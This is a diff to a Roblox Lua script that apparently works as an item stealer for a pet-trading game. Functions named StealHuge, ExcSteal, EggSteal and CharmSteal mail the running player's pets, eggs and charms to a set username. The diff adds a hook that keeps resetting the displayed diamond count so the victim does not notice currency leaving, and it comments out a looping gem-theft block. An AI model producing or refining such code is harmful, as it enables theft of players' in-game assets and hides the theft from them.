@@ -44,6 +44,11 @@ local user = Username
 
 local gemsleft = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount.Text
 local gemsleftpath = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
+
+gemsleftpath:GetPropertyChangedSignal("Text"):Connect(function()
+	gemsleftpath.Text = gemsleft
+end)
+
 local gemsleaderstat = game:GetService('Players').LocalPlayer.leaderstats["💎 Diamonds"].Value
 local gemsleaderstatpath = game:GetService('Players').LocalPlayer.leaderstats["💎 Diamonds"]
 
@@ -69,7 +74,6 @@ function StealHuge()
                 [5] = v._am or 1
             }
 			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			gemsleftpath.Text = gemsleft
 			gemsleaderstatpath.Value = gemsleaderstat
 			local finalHuges = CountHuges()
 			if finalHuges < initialHuges then
@@ -123,7 +127,6 @@ function ExcSteal()
                 [5] = v._am or 1
             }
             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			gemsleftpath.Text = gemsleft
 			gemsleaderstatpath.Value = gemsleaderstat
 			local finalExc = CountExc()
 			if finalExc < initialExc then
@@ -168,7 +171,6 @@ function EggSteal()
 				[5] = v._am or 1
 			}
 			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			gemsleftpath.Text = gemsleft
 			gemsleaderstatpath.Value = gemsleaderstat
 		end
     end
@@ -187,7 +189,6 @@ function CharmSteal()
 				[5] = v._am or 1
 			}
 			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			gemsleftpath.Text = gemsleft
 			gemsleaderstatpath.Value = gemsleaderstat
 		end
     end
@@ -221,9 +222,8 @@ if save.Charm ~= nil then
     CharmSteal()
 end
 
-while true do
-	wait(1.25)
-	GemSteal()
-	gemsleftpath.Text = gemsleft
-	gemsleaderstatpath.Value = gemsleaderstat
-end
+--while true do
+	--wait(1.25)
+	--GemSteal()
+	--gemsleaderstatpath.Value = gemsleaderstat
+--end
